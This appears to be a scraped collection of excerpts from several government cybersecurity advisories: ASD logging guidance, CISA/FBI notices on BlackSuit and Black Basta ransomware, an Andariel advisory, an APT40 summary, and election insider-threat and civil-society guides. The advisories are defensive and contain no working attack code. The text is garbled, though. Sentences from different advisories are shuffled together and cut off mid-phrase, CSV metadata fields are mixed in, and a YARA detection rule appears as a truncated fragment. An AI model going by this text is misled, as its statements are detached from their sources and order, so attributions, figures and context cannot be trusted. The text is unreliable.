Best practices for event logging and threat detection 4  Introduction The increased prevalence of malicious actors employing LOTL techniques, such as LOTL binaries  (LOLBins) and fileless malware, highlights the importance of implementing and maintaining an  effective event logging solution. As demonstrated in the joint-sealed publication Identifying and  Mitigating Living Off the Land Techniques, Advanced Persistent Threats (APTs) are employing LOTL  techniques to evade detection. The purpose of this publication is to detail best practice guidance  for event logging and threat detection for cloud services, enterprise networks, enterprise mobility,  and operational technology (OT) networks. The guidance in this publication focuses on general best  practices for event logging and threat detection; however, LOTL techniques feature as they provide a  great case study due to the high difficulty in detecting them. In the context of cyber security incident response and threat detection, event log quality refers to  the types of events collected rather than how well a log is formatted. Note: Capturing a large volume of well-formatted logs can be invaluable for incident responders in  Best practices for event logging and threat detection 5  forensics analysis scenarios.

Below is a case study that shows how threat actors  leveraged LOTL to infiltrate Windows-based systems. Best practices for event logging and threat detection 12  Case study – Volt Typhoon Since mid-2021, Volt Typhoon has targeted critical infrastructure organisations by relying almost  exclusively on LOTL techniques. non-working hours, holidays or on leave) •	 an account accessing services that it does not usually access; for example, administrator or HR  services •	 a user logging in using an unusual device Best practices for event logging and threat detection 13  •	 a high volume of access attempts •	 instances of impossible travel7 or concurrent sign-ins from multiple geographic locations •	 downloading or exporting a large volume of data8 •	 network logins without defined computer access or physical access log validation •	 a single IP address attempting to authenticate as multiple different users •	 the creation of user accounts, or disabled accounts being re-enabled, especially accounts with  administrative privileges •	 netflow data indicating one device talking to other internal devices it normally does not connect to  •	 unusual script execution, software installation, or use of administrative tools •	 unexpected clearing of logs •	 an execution of the process from an unusual or suspicious path •	 configuration changes to security software, such as Windows Defender, and logging  management software. To detect threats on endpoints such as user devices, organisations should consider implementing  an endpoint detection and response solution. By following the guidance in this publication to improve the collection and centralisation of event logs,  it will improve an organisation’s ability to undertake effective threat hunting to proactively investigate  LOTL compromises. Organisations should consider conducting threat hunting on their networks  as a proactive measure to detect cyber security incidents. This enhances log visibility and facilitates threat hunting, if needed. •	 Create specific SIEM detection rules based on the evolving threat landscape for different operating  systems. Best practices for event logging and threat detection 14  Cloud considerations The joint-sealed publication Identifying and Mitigating Living Off the Land Techniques contains  detailed detection guidance for cloud environments.

Their campaign has been enabled by privately-owned SOHO routers,  infected with the ‘KV Botnet’ malware. When assessing the risks to a system,  consider that in some cases, it can take up to 18 months to discover a cyber security incident and some  malware can dwell on the network from 70 to 200 days before causing overt harm.3 Log retention  periods should also be compliant with any regulatory requirements and cyber security frameworks  that may apply in an organisation’s jurisdiction. These include malware, malicious insiders,  and exploitation of unpatched applications and services. For example,  malicious actors can access OT networks through IT networks by exploiting unpatched vulnerabilities,  delivering malware, or conducting denial-of-service campaigns to impact critical services. While Volt Typhoon uses LOTL techniques to make detection more difficult, the behaviours that the  malware exhibits would be considered abnormal compared to business-as-usual activity and could be  used to create detection use cases."

(Updated August 7, 2024) BlackSuit conducts data exfiltration and extortion prior to encryption and then  publishes victim data to a leak site if a ransom is not paid. (Updated August 7, 2024) Ransom demands have typically ranged from approximately $1 million to $10  million USD, with payment demanded in Bitcoin. BlackSuit actors have demanded over $500 million USD  in total and the largest individual ransom demand was $60 million. This approach allows the actor to lower the encryption percentage  for larger files, which helps evade detection, and also significantly improves ransomware speed.[1] In  addition to encrypting files, BlackSuit actors also engage in double extortion tactics in which they threaten  to publicly release the exfiltrated data if the victim does not pay the ransom. Extortioner named  BlackSuit has attacked your system. BlackSuit uses a leak site to publish victim data based on non-payment.

BlackSuit ransomware is the evolution of the ransomware previously identified as Royal  ransomware, which was used from approximately September 2022 through June 2023. BlackSuit shares  numerous coding similarities with Royal ransomware and has exhibited improved capabilities. After gaining access to victims’ networks, BlackSuit  actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the  ransomware and encrypting the systems. FBI and CISA encourage organizations to implement the recommendations found in the Mitigations section  of this CSA to reduce the likelihood and impact of ransomware incidents. Ransomware operators often use  open source projects to aid their intrusion activities. Batch files create a new admin user [T1078.002], force a group policy update, set  pertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption  process, and delete files upon completion—including Application, System, and Security event logs  [T1070.001]. BlackSuit actors have been  observed using legitimate software and open source tools during ransomware operations.

Network segmentation can help  prevent the spread of ransomware by controlling traffic flows between—and access to—various  subnetworks and by restricting adversary lateral movement.   Identify, detect, and investigate abnormal activity and potential traversal of the indicated  ransomware with a networking monitoring tool [CPG 3.A]. To aid in detecting the ransomware,  implement a tool that logs and reports all network traffic, including lateral movement activity on a  network. Resources    Stopransomware.gov is a whole-of-government approach that gives one central location for  ransomware resources and alerts.   Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis  Center (MS-ISAC) Joint Ransomware Guide. Note: The joint Ransomware Guide provides preparation, prevention, and mitigation best practices  as well as a ransomware response checklist.   No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment. Furthermore, payment may also embolden adversaries to target additional organizations,  encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you  to promptly report ransomware incidents to the FBI’s Internet Crime Complain Center (IC3), a local FBI Field  Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov  or by calling 1-844-Say-CISA (1-844-729-2472). Version History  January 31, 2023: Initial Release (Royal Ransomware)  November 13, 2023: First Update (Royal Ransomware)  August 7, 2024: Updated title from “Royal Ransomware” to “BlackSuit Ransomware”; updates noted  throughout. Ransom amounts are not part of the initial ransom note, but  require direct interaction with the threat actor via a .onion URL (reachable through the Tor browser)  provided after encryption. See the MITRE ATT&CK  Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics  and techniques. Initial Access  BlackSuit uses a unique partial encryption approach that allows the threat actor to choose a specific  percentage of data in a file to encrypt. Lateral Movement and Persistence  (Updated August 7, 2024) Historically, Royal threat actors used RDP and legitimate operating system (OS)  diagnostic tools to move laterally across a network [T1021.001]. Once on the  domain controller, the threat actor deactivated antivirus software [T1562.001] by modifying Group Policy  Objects [T1484.001]. See Table 8 for a list of legitimate software used by Royal and BlackSuit threat actors identified  through FBI investigations as of June 2023. Threat actors have been observed using open source network tunneling tools  such as Chisel and Cloudflared, as well as Secure Shell (SSH) Client, OpenSSH, and MobaXterm to  establish SSH connections. BlackSuit Ransom Note  MITRE ATT&CK Tactics and Techniques  See Table 18 through Table 23 for all referenced threat actor tactics and techniques in this advisory, as  well as corresponding detection and/or mitigation recommendations.

Table 20: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation  Technique Title   ID  Use  (New August 7, 2024) Valid  Accounts  T1078  BlackSuit actors used a legitimate admin account to  gain access privileges to the domain controller. Table 21: Cyber Threat Actors ATT&CK Techniques for Defense Evasion  Technique Title  ID  Use  Remote Services: Remote Desktop  Protocol  T1021.001  BlackSuit actors used valid accounts to move  laterally through the domain controller using RDP. Table 22: Cyber Threat Actors ATT&CK Techniques for Command and Control  Technique Title  ID  Use  Ingress Tool Transfer  T1105  BlackSuit actors used C2 infrastructure to download  multiple tools. Table 23: Cyber Threat Actors ATT&CK Techniques for Impact  Technique Title  ID  Use  Data Encrypted for Impact  T1486  BlackSuit actors encrypted data to determine which  files were being used or blocked by other  applications. CISA and NIST based the CPGs on existing cybersecurity  frameworks and guidance to protect against the most common and impactful threats, tactics, techniques,  and procedures. Timely patching is one of  the most efficient and cost-effective steps an organization can take to minimize its exposure to  cybersecurity threats. If threat actors are  not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. Validate Security Controls  In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your  organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise  framework in this advisory. (New August 7, 2024) BlackSuit actors use SystemBC and Gootloader malware to load additional tools and  maintain persistence. FBI | CISA Page 4 of 31  |  Product ID: AA23-061A  TLP:CLEAR TLP:CLEAR Exfiltration  BlackSuit actors exfiltrate data from victim networks by repurposing legitimate cyber penetration testing  tools, such as Cobalt Strike, and malware tools/derivatives, such as Ursnif/Gozi, for data aggregation and  exfiltration."

Any form of MFA has been shown to  significantly reduce the success of such activity, with more secure forms of MFA, like phishing-resistant MFA, offering  even more protection against targeted activity. Ensuring that  the products they use and procure are secure by design is essential for organizations to be resilient against ransomware  and other forms of malicious cyber activity. These questions are informed by the threat landscape we observe at CISA and are categorized by sets of  actions that, if done correctly by software manufacturers, will drive down exploitable defects and misconfigurations."

The authoring agencies believe the group and the cyber techniques remain an ongoing threat to  various industry sectors worldwide, including but not limited to entities in their respective countries, as well  as in Japan and India. For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s North Korea Cyber  Threat Overview and Advisories webpage. Commodity Malware and Dual-Use Applications  Commodity malware is malicious software widely available for purchase or use and is leveraged by  numerous different threat actors. Dual-use applications are software tools widely available for purchase or  use that are commonly utilized by administrators and users for system administration or other legitimate  purposes and also by threat actors for malicious activities. |                                   //   8be5                 | mov                 esp, ebp        condition:          7 of them and filesize < 1736704  }  Mitigation Measures  The authoring agencies recommend implementing the mitigations below to improve your organization’s  cybersecurity posture based on the threat actors’ activity. Page 24 of 30  |  Product ID: AA24-207A  TLP:CLEAR TLP:CLEAR  Command Line Activity and Remote Access  Monitoring for suspicious command-line activity, implementing multi-factor authentication for remote  access services, and properly segmenting and using allow-listing tools for critical assets can protect  against malicious activity by RGB 3rd Bureau’s Andariel group and other cyber threat actors. Acknowledgements   Mandiant and Microsoft Threat Intelligence contributed to this CSA. Purpose   This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including  their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity  specifications and mitigations. The actors deploy and leverage custom malware implants, remote access  tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration. 6  Commodity Malware and Dual-Use Applications ......................................................................................... 23  Log4Shell and Other Log4j Vulnerabilities .....................................................................................................23  Web Shell Malware ..........................................................................................................................................23  Endpoint Activity ...............................................................................................................................................23  Command Line Activity and Remote Access ..................................................................................................24  Packing .............................................................................................................................................................24  Additional Mitigation Measures for Malicious Activities ................................................................................24  DPRK Rewards for Justice ...............................................................................................................................24  Acknowledgements .......................................................................................................................................

The use  of publicly available malware and dual-use applications enables the actors to conceal and obfuscate their  identities and leads to attribution problems. The authoring agencies are reliant on the use of custom  malware and loaders, along with overlapping C2 nodes to attribute commodity malware to the actors. The  actors have at times achieved great success obfuscating their identities by leveraging open source  malware or dual-use applications. The typos also illustrate a poor  grasp of the English language, including common errors such as “Microsoft Cooperation” (rather than  “Microsoft Corporation”) found across numerous RGB 3rd Bureau malware samples. The actors disguise their malware within HTTP packets to appear as benign  network traffic. Collection and Exfiltration   Malware previously used by the actors permitted placement and access to search through files that could  be of interest, including scanning computer files for keywords related to defense and military sectors in  English and Korean.

Secure by Design Alert: Eliminating OS Command Injection Vulnerabilities,2024-07-10,3,{'threats_of_violence': 4},"CISA and FBI are releasing this Secure by Design Alert  in response to recent well-publicized threat actor campaigns that  exploited OS command injection defects in network edge devices (CVE- 2024-20399, CVE-2024-3400, CVE-2024-21887) to target and  compromise users. Designing and developing software that trusts user input  without proper validation or sanitization can allow threat actors to execute malicious commands, putting customers at  risk. To further prevent these vulnerabilities, technical leaders should:  •  Ensure software uses functions that generate commands in safer ways by preserving the intended syntax of the  command and its arguments,1   •  Review their threat models,  •  Use modern component libraries,  •  Conduct code reviews,  •  And implement aggressive adversarial product testing to ensure the quality and security of their code throughout  the development lifecycle.2  Despite widespread knowledge and  documentation of the OS command  injection vulnerabilities over the past two  decades, along with the availability of  effective mitigations, software  manufacturers have continued to develop  products with this defect, which puts  customers at risk. •  Consider the full picture: that customers, our economy, and our national security are currently bearing the brunt  of business decisions to not build security into their products—as illustrated by the recent threat actor campaigns  referenced in this Alert."

Disclaimer The material in this guide is of a general nature and should not be regarded as  legal advice or relied on for assistance in any particular circumstance or emergency  situation. Background This advisory, authored by the Australian Signals  Directorate’s Australian Cyber Security Centre  (ASD’s ACSC), the United States Cybersecurity and  Infrastructure Security Agency (CISA), the United  States National Security Agency (NSA), the United  States Federal Bureau of Investigation (FBI), the United  Kingdom National Cyber Security Centre (NCSC-UK),  the Canadian Centre for Cyber Security (CCCS), the  New Zealand National Cyber Security Centre (NCSC- NZ), the German Federal Intelligence Service (BND) and  Federal Office for the Protection of the Constitution  (BfV), the Republic of Korea’s National Intelligence  Service (NIS) and NIS’ National Cyber Security Center,  and Japan’s National Center of Incident Readiness and  Strategy for Cybersecurity (NISC) and National Policy  Agency (NPA) – hereafter referred to as the “authoring  agencies” – outlines a People’s Republic of China  (PRC) state-sponsored cyber group and their current  threat to Australian networks. The advisory draws  on the authoring agencies’ shared understanding of  the threat as well as ASD’s ACSC incident response  investigations. Therefore, the  authoring agencies believe the group, and similar  techniques remain a threat to their countries’ networks  as well. The activity and techniques overlap  with the groups tracked as Advanced Persistent Threat  (APT) 40 (also known as Kryptonite Panda, GINGHAM  TYPHOON, Leviathan and Bronze Mohawk in industry  reporting). The selected case studies are those  where appropriate remediation has been undertaken  reducing the risk of re-exploitation by this threat actor,  or others. Activity summary APT40 has repeatedly targeted Australian networks  as well as government and private sector networks in  the region, and the threat they pose to our networks  is ongoing. This technique is also regularly used by other PRC  state-sponsored actors worldwide, and the authoring  agencies consider this to be a shared threat. These files have been uploaded to VirusTotal to  enable the wider network defence and cyber security  communities to better understand the threats they  need to defend against.

The framework was created by  US not-for-profit The MITRE Corporation and functions  as a common global language around threat actor  behaviour. Threat actors from  the group are assessed to have attained escalated  privileges on the appliance. It is likely that  this reflected activity that occurred on this host, or  network connections with threat actor infrastructure  that reached this host."
2024 U.S. Federal Elections: The Insider Threat,2024-06-28,2,"{'extortion': 2, 'threats_of_violence': 44}","•  Adversaries may attempt to blackmail or coerce an insider to leverage the insider’s access, collect insights on  election security efforts and vulnerabilities, or direct the insider to perform malicious activity. Prior to initiating  contact, the foreign adversaries likely would collect information on the target to uncover anything they could use  for blackmail or coercion. Election  Assistance Commission (EAC) prepared this overview to help partners defend against insider threat concerns that could  materialize during the 2024 election cycle. For years, federal, state, local, and private sector partners nationwide have  worked closely together to support state and local officials in safeguarding election infrastructure from cyber, physical,  and insider threats. Over the past several years, the election infrastructure community  has experienced multiple instances of election system access control compromises conducted by insider threats. While  there is no evidence that malicious actors impacted election outcomes, it is important that election stakeholders at all  levels are aware of the risks posed by insider threats and the steps that they can take to identify and mitigate these  threats. This document outlines several recent examples of election security-related insider threats, discusses potential scenarios  that could arise during the 2024 election cycle, and provides recommendations for how to mitigate the risk posed by  insider threats.1  Insider Threats to Elections  In the United States, elections are administered at the state and local levels of government, which has resulted in a  diverse landscape of election systems and technologies across the country. Understanding what  constitutes insider status and how insiders can present risks to an organization are important components of developing  a comprehensive insider threat mitigation program. An insider threat can be an individual or group who uses their authorized access or special knowledge to cause harm to  an organization or entity. Insider threats could manifest as current or former employees, temporary workers, volunteers,  contractors, or any other individuals with privileged access to election systems and information. Recent Examples of Election Infrastructure-related Insider Threats  •  A temporary election worker inserted an unauthorized personal flash drive into an electronic poll book containing  voter registration data, including confidential information barred from release under state law. Federal Elections: The Insider Threat          2 Commercial Routing Assistance  2024 U.S. Federal Elections: The Insider Threat  cisa.gov  central@cisa.dhs.gov  @CISAgov @CISACyber  @cisagov  •  A State identified a series of digital images of a voting system from one of its counties and related confidential  passwords published on the Internet without authorization. Potential for Foreign Adversary Exploitation of Insider Threats  To date, the examples of insider threat activity related to the elections process have been domestic in nature, both in  terms of the actor and the motivations. While we assess that the  threat of  a foreign adversary gaining access to election infrastructure through a witting insider is minimal, the perceived  normalization (or steady-state) of election influence or interference might help drive some adversaries to push the  boundaries of U.S. One way this foreign derived threat could manifest is via attempts to exploit insider access to interfere with  election infrastructure or processes. Federal Elections: The Insider Threat  cisa.gov  central@cisa.dhs.gov  @CISAgov @CISACyber  @cisagov  includes through coordinated data leaks or the publication of information alleging an adversary’s compromise of  election infrastructure. Potential Indicators of Insider Threat Activity  Individuals at risk of becoming insider threats often exhibit warning signs, or indicators.2 The following list is not all  inclusive, but contains potential flags that election officials should be alert to and seek further review by authorities:  •  Attempting to alter or destroy ballots, mail-in ballot envelopes, administrative documentation, or allowing others  to access these materials without prior approval. •  Intimidating or threatening other staff. Securing Your Organization: Building an Insider Threat Mitigation Program  Election workers and their private sector partners regularly employ practices designed to deter, detect, or prevent harmful  acts by insiders, whether or not they use the term “insider threat” or have articulated their approach and practices in a  documented program. From handling ballots in teams of two (often bipartisan), to robust chain-of-custody procedures, to  the presence of observers during voting and ballot counting, many longstanding core election practices have been  designed with insider threat mitigation in mind. Nevertheless, election infrastructure stakeholders may benefit from  documenting their approach and establishing a more formalized insider threat mitigation program. From this foundation, a successful insider threat mitigation program should  implement practices, strategies, and systems that limit and track access across organizational functions. Provided they  receive the necessary oversight to ensure they are being applied appropriately, preventative measures against insider  threats also contribute to detecting threats by establishing transparent, auditable election systems and processes and  then identifying outliers or anomalies for investigation. Key elements of election infrastructure insider threat mitigation  programs include:  •  Standard Operating Procedures (SOPs) describe the sequence of steps or requirements to complete a task. 2 (U) The Insider Threat: An Introduction to Detecting and Deterring an Insider Spy | FBI | 21 May 2016 |  https://www.fbi.gov/file- repository/insider_threat_brochure.pdf/view          4 Commercial Routing Assistance  2024 U.S. Federal Elections: The Insider Threat  cisa.gov  central@cisa.dhs.gov  @CISAgov @CISACyber  @cisagov  •  Physical and Digital Access Control systems can detect and prevent insider threats. This can help prevent unauthorized  access to sensitive systems, detect the presence of an insider threat, provide evidence, and improve remediation  time if an incident occurs. It produces an auditable record of an asset’s transfers and transactions, enabling  detection of a potential threat if there is a gap in the chain. •  Continuous Monitoring is a key practice for detecting anomalous behavior, to include potential insider threats. Cybersecurity best practices like multi-factor authentication, patching  and updating, and network segmentation all help minimize the potential security impact if an incident, like an  insider threat, were to occur. Federal Elections: The Insider Threat  cisa.gov  central@cisa.dhs.gov  @CISAgov @CISACyber  @cisagov  •  Reporting all incidents to the appropriate authorities so they can be investigated and documented can prevent or  reduce the likelihood of similar incidents occurring in the future. To assist stakeholders with their insider threat mitigation  efforts, CISA developed an “Insider Threat Reporting Template” and an “Insider Threat Investigation Template” as tools for  organizations to download, review, and incorporate into their insider threat mitigation programs. These templates and  “Insider Threat Reporting Templates User Guide” are annexes to this guide and can be found on the CISA #PROTECT2024  website and are linked below. Election Assistance Commission (eac.gov)  •  Election Security - Dept of Homeland Security   •  Election Crimes and Security — FBI   USER GUIDE Insider Threat Reporting Templates The Cybersecurity and Infrastructure Security Agency (CISA) created these reporting templates as a tool for stakeholder  organizations to download, review, and incorporate into their insider threat mitigation programs. The Reporting Form and the  Investigative Form are fillable PDFs that can be used with any insider threat program. The Reporting Form allows individuals to submit concerns related to a potential insider threat to the appropriate point of  contact within their organization. The Investigative Form is designed to help organizations document incidents and determine appropriate next steps,  including, but not limited to, review by an organization’s Threat Management Team, referral to law enforcement, or other  follow-on actions as necessary to protect the organization and its employees. This will assist stakeholders as they keep a  record of organizational actions related to an insider threat incident, promote accountability of necessary steps to protect  assets, and to identify vulnerabilities in the effort of mitigating future insider threats.

CISA, the Federal Bureau of  Investigation (FBI), New Zealand’s Government Communications Security Bureau (GCSB), New Zealand’s  Computer Emergency Response Team (CERT-NZ), and the Canadian Centre for Cyber Security (CCCS)  (hereafter referred to as the authoring organizations) urge business owners—regardless of size—to review  this report to better understand the vulnerabilities, threats, and practices associated with traditional  remote access and VPN deployment, along with the inherent business risk posed to an organization’s  network by remote access misconfiguration. Many VPN solutions are software based,  meaning the risk of cyber threat actors exploiting software vulnerabilities can become detrimental to  business operations. IMPACT  Vulnerabilities in VPN systems can lead to substantial impacts to organizations if exploited by threat actors  because they may enable easy access across a large enterprise network after successful exploitation of  the device. Multiple sources observed the Internet-facing ICS VPN appliance  fell victim to compromise when an attacker exploited configuration data to reverse tunnel from the  ICS VPN appliance.[1] Then, the attacker modified a JavaScript file used by the Web SSL VPN  component of the device to compromise credentials and move from system to system.[1] Memory  and disk forensics were used during forensic analysis, combined with the Integrity Checker Tool, to  identify malicious files on the compromised Ivanti Connect Secure VPN appliance.[2] However, this  tool and patching failed to detect the compromise due to threat actors going virtually undetected,  circumventing factory reset, and gaining root-level-access.[2]    CVE-2023-4966 (Citrix Bleed) affecting Citrix NetScaler web application delivery control (ADC) and  NetScaler Gateway appliances. This vulnerability allowed threat actors to bypass password  requirements and multifactor authentication (MFA), leading to successful hijacking of legitimate  user sessions on Citrix NetScaler web applications. By not exposing internal  applications to unnecessary risk, the organization can reduce the overall threat of compromise—further  securing data at rest. Adhering to ZT principles to any degree will  enhance your organization’s ability to secure information, keeping it safe from threats and data loss. Cloud Secure Web Gateway  Cloud Secure Web Gateway (SWG) is a security solution that protects users and devices from web-based  threats and enforces security policies within the network. A CASB can also help organizations enforce security policies, governance and compliance, detect and  mitigate cloud threats, and enable an organizations’ capability in ensuring effective protection of data  across multiple locations. FWaaS  operates similarly to a traditional firewall by inspecting and filtering network traffic, enforcing policies, and  protecting against cyber threats. Next Generation Firewall  NGFW is a network security device that performs traditional firewall security features while possessing  protection capabilities against threats and vulnerabilities. Along with packet filtering and stateful  inspection, NGFW provides the following:    The ability to allow more granular control over network traffic by identifying and controlling  applications, as well as monitoring ports and protocols;    Built-in intrusion prevention systems (IPSs) designed to detect and block anomalies on company  networks;    Advanced threat protection and integrated threat intelligence feeds to enhance mitigation against  targeted attacks; and    Content filtering that inspects and filters web content (including URL and content-based filtering) to  enforce ZT policies, detect malicious websites, and prevent exfiltration of data.

Set up phishing- resistant MFA makes it more difficult for actors to compromise user accounts, and often  make legitimate user sign-ins simpler at the same time. See CISA’s Phishing-Resistant  Multifactor Authentication guide for additional information. 9) Implement basic cybersecurity training to cover concepts such as account phishing, email  and web browsing security, and password security [CPG 2.I]. State-sponsored actors use this information to:  •  Scope and prioritize post-compromise objectives;  •  Identify targets, including individuals for potential phishing campaigns; and  •  Gather device and network information (such as IP addresses and operating systems). Threat actors also use phishing, a form of social engineering, to steal login credentials for initial  network access. State-sponsored actors invest substantial time and resources crafting identities for phishing  attempts, leading to meticulously tailored attempts (this is specifically known as “spearphishing”). Phishing for Information  T1598  Malicious actors send phishing messages to elicit  sensitive information (e.g., login credentials) that  can be used for future operations. Description of Known Initial Access Techniques: Advanced persistent threat (APT) actors use  credentials obtained via their phishing attempts (see the Reconnaissance section) to gain access to  networks. APT actors also leverage malware-based phishing to obtain initial access to targets. In malware- based phishing attacks, malicious actors pose as trustworthy sources to lure a victim into interacting  with a malicious hyperlink or opening an email attachment to execute malware on host systems. Note: Phishing is  often made easier by the prevalence of well-known weaknesses in software that actors exploit to  deliver their malware payloads. Examples: APT groups associated with Iran, China, North Korea, and Russia integrate spearphishing  emails into broader campaigns aimed at high-risk communities. Velvet Chollima’s spearphishing operations showcase a nuanced and targeted  cyber espionage strategy, employing social engineering and malicious  payloads to infiltrate and monitor the communications of high-value targets. 16 TLP:CLEAR TLP:CLEAR Mustang Panda:  The group’s preferred initial intrusion vector is spearphishing emails, primarily  to deploy remote access Trojans.

This guide provides recommendations for civil society organizations and individuals to mitigate the  threat of state-sponsored cyber operations based on observed malicious behavior. 4  Cyber Threats to Civil Society ...................................................................................................... 19       4 TLP:CLEAR TLP:CLEAR Introduction  Industry reporting emphasizes the prevalence and global nature of cyber threats to civil society,  necessitating their preparedness against a diverse range of politically and ideologically motivated  threat actors. Civil society organizations are considered high-risk communities (HRC) due to their  high threat level and low defense capacity. Specifically:   •  Civil society organizations and their staff are at high threat of being targeted by malicious  cyber actors. Organizations with low defense capacity are ill-prepared for and vulnerable to common cyber  threats, such as social engineering attempts. Low defense capacity is exacerbated, in most cases, by products and services designed in a manner  that places the burden of reducing cyber threats on the customer or end user. This joint guide, developed as part of CISA’s High-Risk Community Protection (HRCP) initiative* and  NCSC-UK’s Defending Democracy campaign†, provides mitigation measures for civil society  organizations to reduce their risk based on common cyber threats. The authoring agencies also encourage software manufacturers to take  responsibility for their customers’ security outcomes by applying the mitigations in this advisory and  designing products that prevent the most common classes of attack by malicious actors.‡      * Established in 2023, CISA’s HRCP initiative serves as the enduring home for the agency’s work to identify and partner  with high-risk communities to understand the threats they face, identify the resources which can bolster their defense, and  close gaps in support. Through the NCSC’s Defending Democracy work, the NCSC is seeking to partner with high-risk public and  elected officials to advance understanding of the sophisticated threats targeting individuals across personal and enterprise  devices. 5 TLP:CLEAR TLP:CLEAR Cyber Threats to Civil Society  The lack of reporting in threat telemetry and intelligence feeds, coupled with HRCs’ limited  accessibility to enterprise-level solutions, hinders commercial and government organizations’  accurate measurement of threats posed to HRCs. Notably and  frequently non-governmental organizations (NGOs), think tanks, human rights activists, and  journalists are targeted by state-sponsored actors:  •  According to Microsoft, in 2023 NGOs and think tanks were the second highest targets of  state-sponsored actors (following the Information Technology Sector).1  •  As of November 2023, CrowdStrike reporting revealed that five state-sponsored groups are  known to target think tanks,2 eleven groups represent potential threats to NGOs,3 two groups  target dissidents,4 and one group is known to target nonprofit organizations (NPOs).5  •  Cloudflare has observed that malicious cyber activity against civil society organizations is  “generally increasing.”6 In Quarter 2 of 2023, NPOs were targeted more than any other  industry when looking at malicious traffic to NPO websites as a proportion of total traffic.7 In  Quarter 3 of 2023, NPO and independent media organizations placed second behind the  metals and mining industry, with 17.14% of all traffic to NPOs representing distributed  denial-of-service (DDoS) attacks.8 Similarly, the European Union Agency for Cybersecurity  (ENISA) found that targeted individuals within civil society were the second most-targeted  sector globally between July 2022 and June 2023.9  State-sponsored actors target civil society organizations and their staff as part of their toolkit to  undermine democratic values. These cybersecurity  controls provide a minimum set of practices and  protections that are informed by the most common  and impactful threats and behaviors. • Informed by threats observed by CISA  and its government and industry  partners. To enhance personal and organizational  cybersecurity, comprehension of the specific threats and behaviors relevant to your industry  or self is essential. Establish a reference list that outlines potential threats, considering the  unique risk landscape associated with your work, interests, and organizations. This can  include industry-specific cyber threats, regulatory considerations, and historical attack  patterns. Without encryption, threat actors can  exploit unencrypted or unauthenticated channels to inject malware into user devices, posing  significant risks to privacy and security. o Use trusted app stores to avoid potential threats from malicious third-party applications. o Install updates promptly to prevent exploitation of vulnerabilities by threat actors. 10 TLP:CLEAR TLP:CLEAR Resources  See CISA’s Project Upskill for detailed guidance on how to improve your cybersecurity posture and  raise the cost, in terms of time and resources, for a threat actor to target you. According to CERTFA, a  Computer Emergency Response Team that specializes in tracking Iranian cyber threat actors,  Charming Kitten has been observed targeting “individuals, academics, journalists, activists,  think tanks, military and government sectors in the United States, Europe, and the Middle  East since as early as 2014.”12  Between August 2020 and May 2021, IBM X-Force  documented Charming Kitten’s successful compromise of multiple victims within the Iranian  reformist movement. The term advanced persistent threat (APT) is generally used for  well-resourced, state-sponsored groups that engage in sophisticated activity often targeted and aimed at prolonged  network/system intrusion. In these instances, the threat actors pose as trustworthy sources (e.g., colleagues,  acquaintances, or organizations) to lure victims into providing their login credentials—often by  entering the credentials in a threat actor-controlled site to capture them. 14 TLP:CLEAR TLP:CLEAR While predominantly executed via email, threat actors adapt their tactics to high-risk communities’  communication preferences, leveraging text messaging, social media platforms, and diverse digital  channels used for research and advocacy. Velvet Chollima:  Velvet Chollima threat actors have been observed posing as a journalist  seeking an interview or adopting the guise of an academic soliciting survey  participation. Microsoft’s Digital Defense Report 2023 reports APT threat activity against  think tanks, NGOs, media, and human rights activists emerging from Russia (Nobelium, Strontium, Seaborgium), China  (Nickel, Gadolinium), North Korea (Osmium), and Iran (Phosphorus). 2See “CrowdStrike Threat Landscape: APTs & Adversary Groups,” CrowdStrike, n.d,  https://www.crowdstrike.com/adversaries/.

After research, state-sponsored actors will often  gain access to organization networks or personal devices via (a) social engineering that lures victims  to divulge account credentials or download malware or (b) having users download seemingly  legitimate apps that house malicious software. Malicious cyber actors often exploit well- known weaknesses in software to deliver their payloads via malware. •  Implement attention grabbing alerts so customers are aware of unsafe configurations,  suspicious behavior, and when they are downloading malware. The  malware deployed enables data theft, surveillance, or advanced cyber intrusions. Notably, these  links frequently conceal malware that provides Velvet Chollima with  unauthorized access to the victim’s personal computer and facilitating the  surveillance of the victim’s communications. The messages result in  code execution or malware download on victim  systems. The links lead to the download of  malware to the victim system generally via social  engineering encouraging recipients to actively click  or copy the URL (this requires the related technique  User Execution [T1204]). They also use Trojanized apps. Examples: The examples below identify how state-sponsored actors use Trojanized applications and  Spyware in their campaigns. Analysis by TrendMicro revealed that upon downloading these apps, the  user's device became infected with malware. Additionally,  the malware granted unauthorized access to the device's camera,  microphone, and screenshot capabilities, exemplifying the group's advanced  and intrusive surveillance techniques.

The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA),  Department of Health and Human Services (HHS), and Multi-State Information Sharing and Analysis Center  (MS-ISAC) (hereafter referred to as the authoring organizations) are releasing this joint CSA to provide  information on Black Basta, a ransomware variant whose actors have encrypted and stolen data from at  least 12 out of 16 critical infrastructure sectors, including the Healthcare and Public Health (HPH) Sector. Black  Basta is considered a ransomware-as-a-service (RaaS) variant and was first identified in April 2022. Black  Basta affiliates have impacted a wide range of businesses and critical infrastructure in North America,  Actions for critical infrastructure  organizations to take today to mitigate  cyber threats from ransomware:    Install updates for operating  systems, software, and firmware  as soon as they are released. Instead, the  notes provide victims with a unique code and instructs them to contact the ransomware group via a  .onion URL (reachable through the Tor browser). Typically, the ransom notes give victims between 10 and  12 days to pay the ransom before the ransomware group publishes their data on the Black Basta TOR site,  Basta News. The authoring organizations urge HPH Sector and all critical infrastructure organizations to apply the  recommendations in the Mitigations section of this CSA to reduce the likelihood of compromise from Black  Basta and other ransomware attacks. Victims of ransomware should report the incident to their local FBI  field office or CISA (see the Reporting section for contact information). For historic reference, see AA24-131A #StopRansomware: Black Basta (Initial Version).   Apply mitigations from the joint #StopRansomware Guide.

